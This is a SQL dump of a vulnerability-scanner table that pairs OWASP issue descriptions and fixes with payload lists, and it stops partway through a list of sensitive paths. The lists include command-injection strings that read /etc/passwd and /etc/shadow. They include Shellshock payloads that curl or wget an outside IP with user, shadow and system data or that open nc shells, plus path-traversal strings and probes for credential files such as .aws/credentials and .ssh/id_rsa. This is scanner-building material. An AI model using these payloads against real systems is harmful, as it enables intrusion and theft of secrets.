-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: db
-- Generation Time: Apr 16, 2024 at 07:38 AM
-- Server version: 8.3.0
-- PHP Version: 8.2.8

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `robo`
--

-- --------------------------------------------------------

--
-- Table structure for table `owasp`
--

CREATE TABLE `owasp` (
  `OID` int NOT NULL,
  `Vul_name` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `Vul_des` varchar(5000) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `vul_sol` varchar(5000) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `vul_ref` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `payloadlist` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin,
  `OType` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `PID` int DEFAULT NULL,
  `Severity` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL
) ;

--
-- Dumping data for table `owasp`
--

INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(0, 'Command Injection', 'Operating system command injection vulnerabilities arise when an application incorporates user-controllable data into a command that is processed by a shell command interpreter. If the user data is not strictly validated, an attacker can use shell metacharacters to modify the command that is executed, and inject arbitrary further commands that will be executed by the server.\r\n\r\nOS command injection vulnerabilities are usually very serious and may lead to compromise of the server hosting the application, or of the application\'s own data and functionality. It may also be possible to use the server as a platform for attacks against other systems. The exact potential for exploitation depends upon the security context in which the command is executed, and the privileges that this context has regarding sensitive resources on the server.', 'If possible, applications should avoid incorporating user-controllable data into operating system commands. In almost every situation, there are safer alternative methods of performing server-level tasks, which cannot be manipulated to perform additional commands than the one intended.\r\n\r\nIf it is considered unavoidable to incorporate user-supplied data into operating system commands, the following two layers of defense should be used to prevent attacks:\r\n\r\nThe user data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable shell metacharacter or whitespace, should be rejected.\r\nThe application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection. For example, the Java API Runtime.exec and the ASP.NET API Process.Start do not support shell metacharacters. This defense can mitigate the impact of an attack even in the event that an attacker circumvents the input validation defenses.', 'https://portswigger.net/kb/issues/00100100_os-command-injection', '{\n    \"common-inject\": [\n      \"\",\n      \"&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;\",\n      \"&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;\",\n      \"&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;\",\n      \"&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;\",\n      \"/index.html|id|\",\n      \";id;\",\n      \";id\",\n      \";netstat -a;\",\n      \";system(\'cat%20/etc/passwd\')\",\n      \";id;\",\n      \"|id\",\n      \"|/usr/bin/id\",\n      \"|id|\",\n      \"|/usr/bin/id|\",\n      \"||/usr/bin/id|\",\n      \"|id;\",\n      \"||/usr/bin/id;\",\n      \";id|\",\n      \";|/usr/bin/id|\",\n      \"\",\n      \"/bin/ls -al\",\n      \"\",\n      \"\",\n      \"/usr/bin/id\",\n      \"\",\n      \"\",\n      \"id\",\n      \"\",\n      \"\",\n      \"/usr/bin/id;\",\n      \"\",\n      \"id;\",\n      \"\",\n      \"/usr/bin/id|\",\n      \"\",\n      \"id|\",\n      \";/usr/bin/id\",\n      \"\",\n      \";id\",\n      \"\",\n      \"|usr/bin/id\",\n      \"\",\n      \"|nid\",\n      \"\",\n      \"`id`\",\n      \"`/usr/bin/id`\",\n      \"a);id\",\n      \"a;id\",\n      \"a);id;\",\n      \"a;id;\",\n      \"a);id|\",\n      \"a;id|\",\n      \"a)|id\",\n      \"a|id\",\n      \"a)|id;\",\n      \"a|id\",\n      \"|/bin/ls -al\",\n      \"a);/usr/bin/id\",\n      \"a;/usr/bin/id\",\n      \"a);/usr/bin/id;\",\n      \"a;/usr/bin/id;\",\n      \"a);/usr/bin/id|\",\n      \"a;/usr/bin/id|\",\n      \"a)|/usr/bin/id\",\n      \"a|/usr/bin/id\",\n      \"a)|/usr/bin/id;\",\n      \"a|/usr/bin/id\",\n      \";system(\'cat%20/etc/passwd\')\",\n      \";system(\'id\')\",\n      \";system(\'/usr/bin/id\')\",\n      \"%0Acat%20/etc/passwd\",\n      \"%0A/usr/bin/id\",\n      \"%0Aid\",\n      \"%0A/usr/bin/id%0A\",\n      \"%0Aid%0A\",\n      \"& ping -i 30 127.0.0.1 &\",\n      \"& ping -n 30 127.0.0.1 &\",\n      \"%0a ping -i 30 127.0.0.1 %0a\",\n      \"`ping 127.0.0.1`\",\n      \"| id\",\n      \"& id\",\n      \"; id\",\n      \"%0a id %0a\",\n      \"`id`\",\n      \"$;/usr/bin/id\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\\\\`whoami\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\\\\`pwd\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\\\\`grep root /etc/shadow\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\\\`uname -a\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\\\\`nc -lvvp 1234 -e /bin/bash\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\\\\`nc -lvvp 1236 -e /bin/bash &\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=5\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 1 && echo vulnerable 1\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 3 && echo vulnerable 3\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 6 && echo vulnerable 6\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\\\\`whoami\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\\\\`pwd\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\\\\`grep root /etc/shadow\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\\\\`uname -a\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\\\\`nc -lvvp 1235 -e /bin/bash\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\\\\`nc -lvvp 1237 -e /bin/bash &\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=4\\\"\",\n      \"cat /etc/hosts\",\n      \"$(`cat /etc/passwd`)\",\n      \"cat /etc/passwd\",\n      \"%0Acat%20/etc/passwd\",\n      \"{{ get_user_file(\\\"/etc/passwd\\\") }}\",\n      \"<!--#exec cmd=\\\"/bin/cat /etc/passwd\\\"-->\",\n      \"<!--#exec cmd=\\\"/bin/cat /etc/shadow\\\"-->\",\n      \"<!--#exec cmd=\\\"/usr/bin/id;-->\",\n      \"system(\'cat /etc/passwd\');\",\n      \"<?php system(\\\"cat /etc/passwd\\\");?>\",\n      \"\",\n      \"\"\n    ]\n  }', 'WSTG-INPV-12', 0, ''),
(1, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 0, 'Low'),
(2, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 0, 'Low'),
(3, 'Missing HttpOnly Attribute in Cookie Header', 'The HttpOnly attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.', 'Implement HttpOnly Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 0, 'Low'),
(4, 'Directory Traversal File Include', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', '{\n    \"pathraversal\": [\n      \"/etc/passwd\",\n      \"/../etc/passwd\",\n      \"/../../etc/passwd\",\n      \"/../../../etc/passwd\",\n      \"/../../../../etc/passwd\",\n      \"/../../../../../etc/passwd\",\n      \"/../../../../../../etc/passwd\",\n      \"/../../../../../../../etc/passwd\",\n      \"/../../../../../../../../etc/passwd\",\n      \"/..%2fetc%2fpasswd\",\n      \"/..%2f..%2fetc%2fpasswd\",\n      \"/..%2f..%2f..%2fetc%2fpasswd\",\n      \"/..%2f..%2f..%2f..%2fetc%2fpasswd\",\n      \"/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd\",\n      \"/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd\",\n      \"/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd\",\n      \"/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd\",\n      \"/%2e%2e/etc/passwd\",\n      \"/%2e%2e/%2e%2e/etc/passwd\",\n      \"/%2e%2e/%2e%2e/%2e%2e/etc/passwd\",\n      \"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\",\n      \"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\",\n      \"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\",\n      \"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\",\n      \"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\",\n      \"/%2e%2e%2fetc%2fpasswd\",\n      \"/%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n      \"/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n      \"/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n      \"/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n      \"/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n      \"/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n      \"/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n      \"/..%252fetc%252fpasswd\",\n      \"/..%252f..%252fetc%252fpasswd\",\n      \"/..%252f..%252f..%252fetc%252fpasswd\",\n      \"/..%252f..%252f..%252f..%252fetc%252fpasswd\",\n      \"/..%252f..%252f..%252f..%252f..%252fetc%252fpasswd\",\n      \"/..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd\",\n      \"/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd\",\n      \"/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd\",\n      \"....//etc/passwd\",\n      \"....//....//etc/passwd\",\n      \"....//....//....//etc/passwd\",\n      \"....//....//....//....//etc/passwd\",\n      \"....//....//....//....//....//etc/passwd\",\n      \"....//....//....//....//....//....//etc/passwd\",\n      \"....//....//....//....//....//....//....//etc/passwd\",\n      \"....//....//....//....//....//....//....//....//etc/passwd\"\n    ]\n  }', 'WSTG-ATHZ-01', 0, 'Medium'),
(5, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 0, 'Low'),
(6, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 0, 'Low');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(7, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', '{\n    \"sensitive\": [\n      \"\",\n      \"/+CSCOE+/logon.html\",\n      \"/+CSCOT+/oem\",\n      \"/+CSCOT+/translation\",\n      \"/-/health\",\n      \"/-/healthy\",\n      \"/-/liveness\",\n      \"/-/readiness\",\n      \"/-/ready\",\n      \"/-/whoami\",\n      \"/..;/examples/jsp/index.html\",\n      \"/..;/examples/servlets/index.html\",\n      \"/..;/examples/websocket/index.xhtml\",\n      \"/..;/manager/html\",\n      \"/.appveyor.yml\",\n      \"/.aws/config\",\n      \"/.aws/credentials\",\n      \"/.aws/credentials.gpg\",\n      \"/.axiom/accounts/do.json\",\n      \"/.azure-pipelines.yml\",\n      \"/.boto\",\n      \"/.build.sh\",\n      \"/.bzr/branch/branch.conf\",\n      \"/.chef/config.rb\",\n      \"/.circleci/config.yml\",\n      \"/.circleci/ssh-config\",\n      \"/.composer-auth.json\",\n      \"/.composer/composer.json\",\n      \"/.config/filezilla/filezilla.xml\",\n      \"/.config/filezilla/recentservers.xml\",\n      \"/.config/gcloud/access_tokens.db\",\n      \"/.config/gcloud/configurations/config_default\",\n      \"/.config/gcloud/credentials.db\",\n      \"/.config/hexchat\",\n      \"/.config/karma.conf.js\",\n      \"/.config/monero-project/monero-core.conf\",\n      \"/.davfs2\",\n      \"/.dbeaver/credentials-config.json\",\n      \"/.docker/ca.pem\",\n      \"/.docker/config.json\",\n      \"/.dockercfg\",\n      \"/.dockerfile\",\n      \"/.Dockerfile\",\n      \"/.drone.yml\",\n      \"/.DS_Store\",\n      \"/.editorconfig\",\n      \"/.env\",\n      \"/.env.backup\",\n      \"/.env.bak\",\n      \"/.env.config\",\n      \"/.env.dev\",\n      \"/.env.dev.local\",\n      \"/.env.development.local\",\n      \"/.env.example\",\n      \"/.env.live\",\n      \"/.env.local\",\n      \"/.env.old\",\n      \"/.env.prod\",\n      \"/.env.prod.local\",\n      \"/.env.production\",\n      \"/.env.production.local\",\n      \"/.env.save\",\n      \"/.env.stage\",\n      \"/.env.staging\",\n      \"/.env.testing\",\n      \"/.env.www\",\n      \"/.env_1\",\n      \"/.env_sample\",\n      \"/.envrc\",\n      \"/.esmtprc\",\n      \"/.ftpconfig\",\n      \"/.git\",\n      \"/.git-credentials\",\n      \"/.git/\",\n      \"/.git/config\",\n      \"/.git/head\",\n      \"/.git/logs/HEAD\",\n      \"/.git/refs/heads\",\n      \"/.gitconfig\",\n      \"/.github/workflows/automerge.yml\",\n      \"/.github/workflows/build.yaml\",\n      \"/.github/workflows/build.yml\",\n      \"/.github/workflows/ci-daily.yml\",\n      \"/.github/workflows/ci-generated.yml\",\n      \"/.github/workflows/ci-issues.yml\",\n      \"/.github/workflows/ci-push.yml\",\n      \"/.github/workflows/ci.yaml\",\n      \"/.github/workflows/ci.yml\",\n      \"/.github/workflows/CI.yml\",\n      \"/.github/workflows/coverage.yml\",\n      \"/.github/workflows/dependabot.yml\",\n      \"/.github/workflows/deploy.yml\",\n      \"/.github/workflows/docker.yml\",\n      \"/.github/workflows/lint.yml\",\n      \"/.github/workflows/main.yaml\",\n      \"/.github/workflows/main.yml\",\n      \"/.github/workflows/pr.yml\",\n      \"/.github/workflows/publish.yml\",\n      \"/.github/workflows/push.yml\",\n      \"/.github/workflows/release.yaml\",\n      \"/.github/workflows/release.yml\",\n      \"/.github/workflows/smoosh-status.yml\",\n      \"/.github/workflows/snyk.yml\",\n      \"/.github/workflows/test.yaml\",\n      \"/.github/workflows/test.yml\",\n      \"/.github/workflows/tests.yaml\",\n      \"/.github/workflows/tests.yml\",\n      \"/.gitignore\",\n      \"/.gitlab-ci.yml\",\n      \"/.hg\",\n      \"/.hg/hgrc\",\n      \"/.hg/requires\",\n      \"/.htaccess\",\n      \"/.htpasswd\",\n      \"/.idea\",\n      \"/.idea/dataSources.xml\",\n      \"/.idea/deployment.xml\",\n      \"/.idea/httpRequests/http-client.cookies\",\n      \"/.idea/httpRequests/http-requests-log.http\",\n      \"/.idea/misc.xml\",\n      \"/.idea/modules.xml\",\n      \"/.idea/php.xml\",\n      \"/.idea/vcs.xml\",\n      \"/.idea/workspace.xml\",\n      \"/.jenkins.sh\",\n      \"/.json\",\n      \"/.mailmap\",\n      \"/.msmtprc\",\n      \"/.netrc\",\n      \"/.npm/anonymous-cli-metrics.json\",\n      \"/.npmignore\",\n      \"/.npmrc\",\n      \"/.passwd-s3fs\",\n      \"/.phpunit.result.cache\",\n      \"/.purple/accounts.xml\",\n      \"/.redmine\",\n      \"/.redmine-cli\",\n      \"/.s3cfg\",\n      \"/.s3ql/authinfo2\",\n      \"/.settings/rules.json?auth=FIREBASE_SECRET\",\n      \"/.shodan/api_key\",\n      \"/.snyk\",\n      \"/.ssh/authorized_keys\",\n      \"/.ssh/authorized_keys2\",\n      \"/.ssh/config\",\n      \"/.ssh/id_dsa\",\n      \"/.ssh/id_rsa\",\n      \"/.ssh/id_rsa.pub\",\n      \"/.ssh/known_hosts\",\n      \"/.ssh/known_hosts.old\",\n      \"/.styleci.yml\",\n      \"/.svn\",\n      \"/.svn/entries\",\n      \"/.svn/prop\",\n      \"/.svn/text\",\n      \"/.travis.sh\",\n      \"/.travis.yml\",\n      \"/.tugboat\",\n      \"/.user.ini\",\n      \"/.vscode/\",\n      \"/.vscode/settings.json\",\n      \"/.well\",\n      \"/.well-known\",\n      \"/.well-known/matrix/client\",\n      \"/.well-known/matrix/server\",\n      \"/.well-known/openid-configuration\",\n      \"/.wget-hsts\",\n      \"/.wgetrc\",\n      \"/.wp-config.php.swp\",\n      \"/////evil.com\",\n      \"///evil.com/%2F..\",\n      \"//admin/\",\n      \"//anything/admin/\",\n      \"//evil.com/%2F..\",\n      \"//evil.com/..;/css\",\n      \"/1.sql\",\n      \"/404.php.bak\",\n      \"/?view=log\",\n      \"/?wsdl\",\n      \"/_/.ssh/authorized_keys\",\n      \"/__/auth/handler\",\n      \"/__/auth/handler/callback\",\n      \"/__/auth/handler/login\",\n      \"/__/auth/handler/signout\",\n      \"/___graphql\",\n      \"/__clockwork/app\",\n      \"/__swagger__/\",\n      \"/_admin\",\n      \"/_cat\",\n      \"/_cat/health\",\n      \"/_cat/indices\",\n      \"/_cluster\",\n      \"/_cluster/health\",\n      \"/_cluster/stats\",\n      \"/_config.yml\",\n      \"/_cperror\",\n      \"/_darcs/prefs/binaries\",\n      \"/_debug\",\n      \"/_debug_toolbar\",\n      \"/_debugbar/open?max=20&offset=0\",\n      \"/_monitoring\",\n      \"/_netrc\",\n      \"/_node\",\n      \"/_nodes\",\n      \"/_nodes/stats\",\n      \"/_notary_server\",\n      \"/_notes/dwsync.xml\",\n      \"/_profiler/\",\n      \"/_profiler/empty/search/results?limit=10\",\n      \"/_profiler/phpinfo\",\n      \"/_profiler/phpinfo.php\",\n      \"/_search\",\n      \"/_site\",\n      \"/_something_.cfm\",\n      \"/_stats\",\n      \"/_status\",\n      \"/_swagger_/\",\n      \"/_trust\",\n      \"/_vti_bin/Authentication.asmx?op=Mode\",\n      \"/_vti_bin/lists.asmx?WSDL\",\n      \"/_wdt/\",\n      \"/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd\",\n      \"/abs/\",\n      \"/access.log\",\n      \"/access/config\",\n      \"/access_tokens.db\",\n      \"/actions/seomatic/meta\",\n      \"/actuator\",\n      \"/actuator/auditevents\",\n      \"/actuator/auditLog\",\n      \"/actuator/beans\",\n      \"/actuator/caches\",\n      \"/actuator/conditions\",\n      \"/actuator/configprops\",\n      \"/actuator/configurationMetadata\",\n      \"/actuator/dump\",\n      \"/actuator/env\",\n      \"/actuator/events\",\n      \"/actuator/exportRegisteredServices\",\n      \"/actuator/favicon.ico\",\n      \"/actuator/features\",\n      \"/actuator/flyway\",\n      \"/actuator/health\",\n      \"/actuator/healthcheck\",\n      \"/actuator/heapdump\",\n      \"/actuator/httptrace\",\n      \"/actuator/hystrix.stream\",\n      \"/actuator/info\",\n      \"/actuator/integrationgraph\",\n      \"/actuator/jolokia\",\n      \"/actuator/liquibase\",\n      \"/actuator/logfile\",\n      \"/actuator/loggers\",\n      \"/actuator/loggingConfig\",\n      \"/actuator/management\",\n      \"/actuator/mappings\",\n      \"/actuator/metrics\",\n      \"/actuator/prometheus\",\n      \"/actuator/refresh\",\n      \"/actuator/registeredServices\",\n      \"/actuator/releaseAttributes\",\n      \"/actuator/resolveAttributes\",\n      \"/actuator/scheduledtasks\",\n      \"/actuator/sessions\",\n      \"/actuator/shutdown\",\n      \"/actuator/springWebflow\",\n      \"/actuator/sso\",\n      \"/actuator/ssoSessions\",\n      \"/actuator/statistics\",\n      \"/actuator/status\",\n      \"/actuator/threaddump\",\n      \"/actuator/trace\",\n      \"/actuators/\",\n      \"/actuators/dump\",\n      \"/actuators/env\",\n      \"/actuators/health\",\n      \"/actuators/logfile\",\n      \"/actuators/mappings\",\n      \"/actuators/shutdown\",\n      \"/actuators/trace\",\n      \"/adfs/ls/idpinitiatedsignon.aspx\",\n      \"/adfs/services/trust/2005/windowstransport\",\n      \"/adjuncts/3a890183/\",\n      \"/admin\",\n      \"/admin../admin\",\n      \"/admin/\",\n      \"/Admin/\",\n      \"/admin/../admin\",\n      \"/admin/.htpasswd\",\n      \"/admin//phpmyadmin/\",\n      \"/admin/adminer.php\",\n      \"/admin/buoy\",\n      \"/admin/config\",\n      \"/admin/config.json\",\n      \"/admin/configs/application.ini\",\n      \"/admin/data/autosuggest\",\n      \"/admin/error.log\",\n      \"/admin/errors.log\",\n      \"/admin/expvar\",\n      \"/admin/gc\",\n      \"/admin/heap\",\n      \"/admin/heapdump\",\n      \"/admin/index.php\",\n      \"/admin/init\",\n      \"/admin/log-level\",\n      \"/admin/log/error.log\",\n      \"/admin/login\",\n      \"/admin/login.html\",\n      \"/admin/login/?next=/admin/\",\n      \"/admin/logs/error.log\",\n      \"/admin/logs/errors.log\",\n      \"/admin/metrics\",\n      \"/admin/outgoing\",\n      \"/admin/ping\",\n      \"/admin/pprof\",\n      \"/admin/proxy/config.json\",\n      \"/admin/proxy/configs\",\n      \"/admin/proxy/discovery\",\n      \"/admin/proxy/metrics\",\n      \"/admin/proxy/routes\",\n      \"/admin/proxy/servers\",\n      \"/admin/proxy/svc\",\n      \"/admin/proxy/tap\",\n      \"/admin/proxy/tree\",\n      \"/admin/proxy/vars\",\n      \"/admin/proxy/versions\",\n      \"/admin/ready\",\n      \"/admin/routes\",\n      \"/admin/runtime/tree\",\n      \"/Admin/ServerSide/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/admin/shutdown\",\n      \"/admin/tap\",\n      \"/admin/threadz\",\n      \"/admin/tls\",\n      \"/admin/tracing\",\n      \"/admin/views/ajax/autocomplete/user/a\",\n      \"/admin;/\",\n      \"/Admin;/\",\n      \"/adminadminer.php\",\n      \"/adminer.php\",\n      \"/adminer/\",\n      \"/adminer/adminer.php\",\n      \"/adminer/index.php\",\n      \"/ADSearch.cc?methodToCall=search\",\n      \"/agent\",\n      \"/agent/server\",\n      \"/agents\",\n      \"/aims/ps/\",\n      \"/airflow.cfg\",\n      \"/AirWatch/Login\",\n      \"/alertmanager/api\",\n      \"/alerts\",\n      \"/alps/profile\",\n      \"/altair\",\n      \"/analytics/saw.dll?bieehome&startPage=1#grabautologincookies\",\n      \"/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd\",\n      \"/anchor/errors.log\",\n      \"/android/app/google-services.json\",\n      \"/anonymous-cli-metrics.json\",\n      \"/ansible.cfg\",\n      \"/anything_here\",\n      \"/apache\",\n      \"/apache.conf\",\n      \"/apc.php\",\n      \"/apc/apc.php\",\n      \"/api\",\n      \"/api-docs\",\n      \"/api-docs/swagger.json\",\n      \"/api-docs/swagger.yaml\",\n      \"/api/\",\n      \"/api/.env\",\n      \"/api/__swagger__/\",\n      \"/api/_swagger_/\",\n      \"/api/admin\",\n      \"/api/api\",\n      \"/api/api-browser/\",\n      \"/api/api-docs\",\n      \"/api/api-docs/swagger.json\",\n      \"/api/api-docs/swagger.yaml\",\n      \"/api/apidocs\",\n      \"/api/apidocs/swagger.json\",\n      \"/api/apidocs/swagger.yaml\",\n      \"/api/application.wadl\",\n      \"/api/batch\",\n      \"/api/cask/graphql\",\n      \"/api/cask/graphql-playground\",\n      \"/api/config\",\n      \"/api/debug\",\n      \"/api/dependencies\",\n      \"/api/docs\",\n      \"/api/docs/\",\n      \"/api/falco\",\n      \"/api/flux\",\n      \"/api/graphql\",\n      \"/api/graphql/v1\",\n      \"/api/index.html\",\n      \"/api/internal\",\n      \"/api/jsonws\",\n      \"/api/jsonws/invoke\",\n      \"/api/operations\",\n      \"/api/plugins.json\",\n      \"/api/plugins.json.xz\",\n      \"/api/profile\",\n      \"/api/proxy\",\n      \"/api/services\",\n      \"/api/snapshots\",\n      \"/api/spec/swagger.json\",\n      \"/api/spec/swagger.yaml\",\n      \"/api/swagger\",\n      \"/api/swagger-resources\",\n      \"/api/swagger-resources/restservices/v2/api-docs\",\n      \"/api/swagger-ui.html\",\n      \"/api/swagger-ui/api-docs\",\n      \"/api/swagger-ui/swagger.json\",\n      \"/api/swagger-ui/swagger.yaml\",\n      \"/api/swagger.json\",\n      \"/api/swagger.yaml\",\n      \"/api/swagger.yml\",\n      \"/api/swagger/index.html\",\n      \"/api/swagger/static/index.html\",\n      \"/api/swagger/swagger\",\n      \"/api/swagger/swagger-ui.html\",\n      \"/api/swagger/ui/index\",\n      \"/api/swagger_doc.json\",\n      \"/api/timelion/run\",\n      \"/api/traces\",\n      \"/api/v1\",\n      \"/api/v1/\",\n      \"/api/v1/alerts\",\n      \"/api/v1/application.wadl\",\n      